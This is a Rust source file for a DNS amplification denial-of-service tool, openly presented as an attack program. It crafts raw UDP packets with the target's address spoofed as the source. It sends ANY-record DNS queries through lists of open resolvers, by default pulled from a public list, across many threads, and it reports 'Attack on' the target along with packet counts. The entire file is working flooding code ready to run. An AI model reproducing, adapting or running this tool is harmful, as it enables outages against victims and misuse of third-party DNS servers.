use std::fs::File;
use std::io::{self, BufRead, BufReader, Error, ErrorKind};
use std::mem;
use std::mem::size_of;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;

use clap::{arg, command, Parser};

use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::ipv6::MutableIpv6Packet;
use pnet::packet::udp::MutableUdpPacket;
use pnet::packet::util::ipv6_checksum;
use pnet::packet::Packet;

use reqwest;
use tokio::time::Instant;
use tokio::{self, signal};

use libc::{sendto, sockaddr, sockaddr_in, sockaddr_in6, AF_INET, IPPROTO_RAW, SOCK_RAW};

static PACKETS_SENT: AtomicU64 = AtomicU64::new(0);

fn colorize(text: &str, color: &str) -> String {
    let color = match color {
        "red" => "31",
        "green" => "32",
        "yellow" => "33",
        "blue" => "34",
        "magenta" => "35",
        "cyan" => "36",
        "white" => "37",
        _ => "0",
    };
    format!("\x1B[{}m{}\x1B[0m", color, text)
}

async fn get_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let response = client.get(url).send().await?.text().await?;
    let servers = response.lines().map(|s| s.trim().to_string()).collect();
    Ok(servers)
}

fn read_dns_servers(file: &str) -> io::Result<Vec<String>> {
    let file = File::open(file)?;
    let reader = BufReader::new(file);

    let mut dns_servers = Vec::new();

    for line in reader.lines() {
        let line = line?;
        let line = line.trim();

        if !line.is_empty() && !line.starts_with('#') {
            dns_servers.push(line.to_owned());
        }
    }

    Ok(dns_servers)
}

fn filter_dns_servers(servers: Vec<String>, source_ip: IpAddr) -> Result<Vec<IpAddr>, Error> {
    let filtered_servers = servers
        .into_iter()
        .filter_map(|server| IpAddr::from_str(&server).ok())
        .filter(|ip| match (source_ip, ip) {
            (IpAddr::V4(_), IpAddr::V4(_)) => true,
            (IpAddr::V6(_), IpAddr::V6(_)) => true,
            _ => false,
        })
        .collect();
    Ok(filtered_servers)
}

fn build_dns_query(domain: &str, record_type: &str) -> Vec<u8> {
    let mut header = [0u8; 12];

    // Transaction ID (random)
    let transaction_id: u16 = rand::random();
    header[0] = (transaction_id >> 8) as u8;
    header[1] = transaction_id as u8;

    // Flags (standard query, recursion desired)
    header[2] = 0x01; // Standard query
    header[5] = 0x01; // Recursion desired

    let mut question = Vec::new();

    // Domain name
    for part in domain.split('.') {
        question.push(part.len() as u8);
        question.extend(part.as_bytes());
    }
    question.push(0); // End of domain name

    let mut record_type_num: u16 = 0x00ff; // Default value for "ANY"
    match record_type {
        "A" => record_type_num = 0x0001,
        "MX" => record_type_num = 0x000f,
        "NS" => record_type_num = 0x0002,
        _ => (), // do nothing for unsupported record types
    }

    question.extend(&record_type_num.to_be_bytes()); // Record type (big-endian)
    question.extend(&0x0001u16.to_be_bytes()); // Record class (big-endian)

    // Combine header and question to form the complete DNS query
    let mut dns_query_buffer = Vec::new();
    dns_query_buffer.extend(&header);
    dns_query_buffer.extend(&question);

    dns_query_buffer
}

trait PacketBuilder<IpAddr> {
    fn build_udp_packet(
        &self,
        src_port: u16,
        dst_ip: &IpAddr,
        dst_port: u16,
        payload: &[u8],
    ) -> Vec<u8>;
    fn build_ip_packet(&self, dst_ip: &IpAddr, payload: &[u8]) -> Vec<u8>;
    fn send_raw_packet(&self, packet: &[u8]) -> Result<(), Error>;
    fn send_dns_query(
        &self,
        dst_ip: &IpAddr,
        domain: &str,
        source_port: u16,
        record_type: &str,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>>;
}

impl PacketBuilder<Ipv4Addr> for Ipv4Addr {
    fn build_udp_packet(
        &self,
        src_port: u16,
        dst_ip: &Ipv4Addr,
        dst_port: u16,
        payload: &[u8],
    ) -> Vec<u8> {
        let mut udp_packet = MutableUdpPacket::owned(vec![0u8; 8 + payload.len()]).unwrap();

        udp_packet.set_source(src_port);
        udp_packet.set_destination(dst_port);
        udp_packet.set_payload(&payload);
        udp_packet.set_length(8 + payload.len() as u16);

        let checksum = pnet::packet::udp::ipv4_checksum(&udp_packet.to_immutable(), &self, &dst_ip);
        udp_packet.set_checksum(checksum);

        udp_packet.to_immutable().packet().to_vec()
    }

    fn build_ip_packet(&self, dst_ip: &Ipv4Addr, payload: &[u8]) -> Vec<u8> {
        let mut ipv4_packet = MutableIpv4Packet::owned(vec![0u8; 20 + payload.len()]).unwrap();

        ipv4_packet.set_version(4);
        ipv4_packet.set_header_length(5);
        ipv4_packet.set_total_length(20 + payload.len() as u16);
        ipv4_packet.set_dscp(0);
        ipv4_packet.set_ecn(0);
        ipv4_packet.set_identification(0x1234);
        ipv4_packet.set_flags(0);
        ipv4_packet.set_fragment_offset(0);
        ipv4_packet.set_ttl(64);
        ipv4_packet.set_next_level_protocol(pnet::packet::ip::IpNextHeaderProtocols::Udp);
        ipv4_packet.set_source(*self);
        ipv4_packet.set_destination(*dst_ip);
        ipv4_packet.set_payload(&payload);

        let checksum = pnet::packet::ipv4::checksum(&ipv4_packet.to_immutable());
        ipv4_packet.set_checksum(checksum);

        ipv4_packet.to_immutable().packet().to_vec()
    }

    fn send_dns_query(
        &self,
        dst_ip: &Ipv4Addr,
        domain: &str,
        source_port: u16,
        record_type: &str,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let dns_query_payload = build_dns_query(domain, record_type);
        let udp_payload = self.build_udp_packet(source_port, dst_ip, 53, &dns_query_payload);
        let ip_payload = self.build_ip_packet(dst_ip, &udp_payload);

        match dst_ip.send_raw_packet(&ip_payload) {
            Ok(_) => {
                PACKETS_SENT.fetch_add(1, Ordering::Relaxed);
                Ok(())
            }
            Err(err) => Err(Box::new(err)),
        }
    }

    fn send_raw_packet(&self, packet: &[u8]) -> Result<(), Error> {
        let sock = match unsafe { libc::socket(AF_INET, SOCK_RAW, IPPROTO_RAW) } {
            -1 => {
                return Err(Error::last_os_error());
            }
            fd => fd,
        };

        let sockaddr = sockaddr_in {
            sin_family: AF_INET as u16,
            sin_port: 0,
            sin_addr: libc::in_addr {
                s_addr: u32::from(*self).to_be(),
            },
            ..unsafe { mem::zeroed() }
        };
        let sockaddr_ptr = &sockaddr as *const _ as *const sockaddr;

        let send_bytes = unsafe {
            sendto(
                sock,
                packet.as_ptr() as *const libc::c_void,
                packet.len(),
                0,
                sockaddr_ptr,
                size_of::<sockaddr_in>() as libc::socklen_t,
            )
        };

        if send_bytes != packet.len() as isize {
            let err = Error::new(ErrorKind::Other, "Failed to send packet");
            unsafe { libc::close(sock) };
            return Err(err);
        }

        let res = unsafe { libc::close(sock) };
        if res == -1 {
            return Err(Error::last_os_error());
        }

        Ok(())
    }
}

impl PacketBuilder<Ipv6Addr> for Ipv6Addr {
    fn build_udp_packet(
        &self,
        src_port: u16,
        dst_ip: &Ipv6Addr,
        dst_port: u16,
        payload: &[u8],
    ) -> Vec<u8> {
        let mut udp_packet = MutableUdpPacket::owned(vec![0u8; 8 + payload.len()]).unwrap();

        udp_packet.set_source(src_port);
        udp_packet.set_destination(dst_port);
        udp_packet.set_length(8 + payload.len() as u16);
        udp_packet.set_payload(payload);

        let checksum = ipv6_checksum(
            &udp_packet.to_immutable().packet()[..],
            0,
            &[],
            &self,
            &dst_ip,
            pnet::packet::ip::IpNextHeaderProtocols::Udp,
        );
        udp_packet.set_checksum(checksum);

        udp_packet.to_immutable().packet().to_vec()
    }

    fn build_ip_packet(&self, dst_ip: &Ipv6Addr, payload: &[u8]) -> Vec<u8> {
        let mut ipv6_packet = MutableIpv6Packet::owned(vec![0u8; 40 + payload.len()]).unwrap();

        ipv6_packet.set_version(6);
        ipv6_packet.set_traffic_class(0xFF);
        ipv6_packet.set_flow_label(0);
        ipv6_packet.set_payload_length(payload.len() as u16);
        ipv6_packet.set_next_header(pnet::packet::ip::IpNextHeaderProtocols::Udp);
        ipv6_packet.set_hop_limit(64);
        ipv6_packet.set_source(*self);
        ipv6_packet.set_destination(*dst_ip);
        ipv6_packet.set_payload(payload);
        ipv6_packet.to_immutable().packet().to_vec()
    }

    fn send_dns_query(
        &self,
        dst_ip: &Ipv6Addr,
        domain: &str,
        source_port: u16,
        record_type: &str,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let dns_query_payload = build_dns_query(domain, record_type);
        let udp_payload = self.build_udp_packet(source_port, dst_ip, 53, &dns_query_payload);
        let ip_payload = self.build_ip_packet(dst_ip, &udp_payload);

        match dst_ip.send_raw_packet(&ip_payload) {
            Ok(_) => {
                PACKETS_SENT.fetch_add(1, Ordering::Relaxed);
                Ok(())
            }
            Err(err) => Err(Box::new(err)),
        }
    }

    fn send_raw_packet(&self, packet: &[u8]) -> Result<(), Error> {
        let sock = unsafe { libc::socket(libc::AF_INET6, libc::SOCK_RAW, libc::IPPROTO_RAW) };
        if sock == -1 {
            return Err(Error::last_os_error());
        }

        let sockaddr = sockaddr_in6 {
            sin6_family: libc::AF_INET6 as u16,
            sin6_port: 0,
            sin6_flowinfo: 0,
            sin6_addr: libc::in6_addr {
                s6_addr: self.octets(),
            },
            sin6_scope_id: 0,
        };
        let sockaddr_ptr = &sockaddr as *const _ as *const libc::sockaddr;

        let send_bytes = unsafe {
            libc::sendto(
                sock,
                packet.as_ptr() as *const libc::c_void,
                packet.len(),
                0,
                sockaddr_ptr,
                size_of::<sockaddr_in6>() as libc::socklen_t,
            )
        };

        if send_bytes != packet.len() as isize {
            let err = Error::new(ErrorKind::Other, "Failed to send packet");
            unsafe { libc::close(sock) };
            return Err(err);
        }

        let res = unsafe { libc::close(sock) };
        if res == -1 {
            return Err(Error::last_os_error());
        }

        Ok(())
    }
}

fn amplify(
    dns_servers: &Vec<IpAddr>,
    domain: &str,
    source_ip: &IpAddr,
    source_port: u16,
    record_type: String,
    aborted: Arc<AtomicBool>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    while !aborted.load(Ordering::Relaxed) {
        for dns_server in dns_servers {
            if aborted.load(Ordering::Relaxed) {
                break;
            }

            match (source_ip, dns_server) {
                (IpAddr::V4(src_ipv4), IpAddr::V4(dns_ipv4)) => {
                    if let Err(e) =
                        src_ipv4.send_dns_query(dns_ipv4, domain, source_port, &record_type)
                    {
                        eprintln!(
                            "[{}] Failed to send DNS query: {}",
                            colorize("WARNING", "yellow"),
                            e
                        );
                        continue;
                    }
                }
                (IpAddr::V6(src_ipv6), IpAddr::V6(dns_ipv6)) => {
                    if let Err(e) =
                        src_ipv6.send_dns_query(dns_ipv6, domain, source_port, &record_type)
                    {
                        eprintln!(
                            "[{}] Failed to send DNS query: {}",
                            colorize("WARNING", "yellow"),
                            e
                        );
                        continue;
                    }
                }
                _ => {
                    eprintln!(
                        "[{}] Mismatched types for source and destination IPs: {} and {}",
                        colorize("ERROR", "red"),
                        colorize(&source_ip.to_string(), "magenta"),
                        colorize(&dns_server.to_string(), "magenta")
                    );
                    continue;
                }
            }
        }
    }

    Ok(())
}

async fn status_update_task(
    aborted: Arc<AtomicBool>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let mut interval = tokio::time::interval(Duration::from_secs(2));

    loop {
        if aborted.load(Ordering::Relaxed) {
            break;
        }
        interval.tick().await;
        let count = PACKETS_SENT.load(Ordering::Relaxed);
        println!(
            "[{}] Packets sent: {}",
            colorize("INFO", "magenta"),
            colorize(&count.to_string(), "red")
        );
    }

    Ok(())
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// IPv4 address of the target
    #[arg(required = true)]
    target: String,
    /// Port of the target
    #[arg(short = 'p', long = "port", required = false, default_value = "53")]
    port: u16,
    /// DNS record type to use [A, MX, NS, ANY]
    #[arg(
        short = 'r',
        long = "record-type",
        required = false,
        default_value = "ANY"
    )]
    record_type: Option<String>,
    /// List of DNS servers to use
    #[arg(short, long, required = false)]
    server_list: Option<String>,
    /// Time of the attack in seconds
    #[arg(short, long, required = false)]
    time: Option<u64>,
    /// Domain to resolve
    #[arg(
        short = 'd',
        long = "domain",
        required = false,
        default_value = "google.com"
    )]
    domain: Option<String>,
    /// Thread count
    #[arg(short = 'm', long = "threads", required = false, default_value = "10")]
    threads: Option<u16>,
    /// DNS resolver to use
    #[arg(short = 'n', long = "dns-resolver", required = false)]
    dns_resolver: Option<String>,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    if unsafe { libc::geteuid() } != 0 {
        eprintln!(
            "[{}] This program must be run as root!",
            colorize("ERROR", "red")
        );
        std::process::exit(1);
    }

    let args = Args::parse();
    let record_type = args.record_type.unwrap();

    let source_ip = args.target;
    let source_ip = match IpAddr::from_str(&source_ip) {
        Ok(ip) => ip,
        Err(_) => {
            eprintln!(
                "[{}] Invalid target IP address {}",
                colorize("ERROR", "red"),
                colorize(&source_ip, "magenta")
            );
            std::process::exit(1);
        }
    };

    let source_port = args.port;
    let time = args.time;
    let domain = args.domain.unwrap();
    let threads = args.threads.unwrap();

    let dns_servers: Vec<IpAddr> = if let Some(dns_resolver) = args.dns_resolver {
        vec![IpAddr::from_str(&dns_resolver)?]
    } else if let Some(server_list) = args.server_list {
        let servers = read_dns_servers(&server_list)?;
        filter_dns_servers(servers, source_ip)?
    } else {
        let servers = get_dns_servers("https://public-dns.info/nameservers.txt").await?;
        filter_dns_servers(servers, source_ip)?
    };

    let aborted = Arc::new(AtomicBool::new(false));
    let start_time = Instant::now();

    println!(
        "[{}] Attack on {} started with {} threads...",
        colorize("INFO", "magenta"),
        colorize(&source_ip.to_string(), "green"),
        colorize(&threads.to_string(), "red")
    );

    let status_task = tokio::spawn(status_update_task(aborted.clone()));
    let mut amplify_tasks = Vec::with_capacity(threads as usize);

    for _ in 0..threads {
        let dns_servers = dns_servers.clone();
        let domain = domain.clone();
        let source_ip = source_ip.clone();
        let source_port = source_port.clone();
        let record_type = record_type.clone();
        let aborted = Arc::clone(&aborted);

        let task = tokio::spawn(async move {
            if let Err(e) = amplify(
                &dns_servers,
                &domain,
                &source_ip,
                source_port,
                record_type,
                aborted,
            ) {
                eprintln!(
                    "[{}] Amplify task failed: {}",
                    colorize("WARNING", "yellow"),
                    e
                );
            }
        });

        amplify_tasks.push(task);
    }

    let aborted_clone = Arc::clone(&aborted);
    let signal_task = tokio::spawn(async move {
        signal::ctrl_c().await.expect("Failed to listen for ctrl-c");
        aborted_clone.store(true, Ordering::Relaxed);
    });

    if let Some(duration) = time {
        tokio::select! {
            _ = tokio::time::sleep(Duration::from_secs(duration)) => {
                aborted.store(true, Ordering::Relaxed);
            }
            _ = signal_task => {
                aborted.store(true, Ordering::Relaxed);
            }
        }
    } else {
        tokio::select! {
            _ = signal_task => {
                aborted.store(true, Ordering::Relaxed);
            }
        }
    }

    for task in amplify_tasks {
        if let Err(e) = task.await {
            eprintln!(
                "[{}] Amplify task encountered an error: {}",
                colorize("ERROR", "red"),
                e
            );
        }
    }

    if let Err(e) = status_task.await {
        eprintln!(
            "[{}] Status update task encountered an error: {}",
            colorize("ERROR", "red"),
            e
        );
    }

    println!(
        "[{}] Attack on {} finished after {} seconds with {} packets sent.",
        colorize("INFO", "magenta"),
        colorize(&source_ip.to_string(), "green"),
        colorize(&start_time.elapsed().as_secs().to_string(), "red"),
        colorize(&PACKETS_SENT.load(Ordering::Relaxed).to_string(), "red")
    );

    Ok(())
}
